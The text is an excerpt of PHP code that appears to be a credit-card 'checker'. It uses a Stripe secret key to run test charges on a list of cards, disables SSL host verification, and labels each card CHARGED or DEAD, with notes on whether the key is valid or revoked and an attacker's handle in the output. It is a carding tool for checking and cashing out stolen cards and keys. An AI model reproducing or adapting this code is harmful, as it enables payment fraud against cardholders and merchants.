...
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$amtarray.'&currency=inr&payment_method_types[]=card');
...
if(strpos($result3, '"seller_message": "Payment complete."' )) {
    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>  『ゆə‌ʍᴏん ⁪⁬⁮⁮』➤ Response: ₹'.$amt.' Charged ✅ <br> ➤ Receipt : HIDDEN  @D3M0N_Giveaway</a><br>';
   $msg = 
"CC : ".$lista."
...
elseif(strpos($result1, "testmode_charges_only" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: SK KEY DEAD OR INVALID『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
}
elseif(strpos($result1, "api_key_expired" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: SK KEY REVOKED『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
}
...
elseif(strpos($result1, "card_not_supported" )) {
    ...
    echo 'DEAD</span> CC:  '.$lista.'</span>  <br>Result: INCREASE AMOUNT OR TRY ANOTHER CARD『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
